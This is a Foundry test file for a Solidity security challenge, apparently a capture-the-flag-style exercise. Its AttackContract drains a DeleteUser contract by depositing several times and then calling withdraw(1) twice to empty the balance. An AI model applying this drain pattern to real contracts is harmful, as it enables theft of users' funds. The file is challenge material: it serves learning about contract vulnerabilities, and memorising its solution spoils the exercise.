// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/DeleteUser.sol";

contract DeleteUserTest is Test {
    DeleteUser victimContract;
    address attackerWallet;

    function setUp() public {
        victimContract = new DeleteUser();
        vm.deal(address(victimContract), 1 ether);
        attackerWallet = address(0x1234);
    }

    function testExploit() public {
        vm.startPrank(attackerWallet);
        vm.deal(attackerWallet, 1 ether);
        // Conduct your attack here
        AttackContract attackerContract = new AttackContract{value: 1 ether}(victimContract);
        // Assert the balance of the victim contract is 0
        assertEq(address(victimContract).balance, 0);

        // Assert the attacker wallet has conducted one transaction
        assertEq(vm.getNonce(attackerWallet), 1);
    }
}

contract AttackContract {
    DeleteUser victimContract;

    constructor(DeleteUser _victimContract) payable {
        victimContract = _victimContract;

        victimContract.deposit();
        victimContract.deposit{value: 1 ether}();
        victimContract.deposit();

        victimContract.withdraw(1);
        victimContract.withdraw(1);
    }

    fallback() external payable {}
}
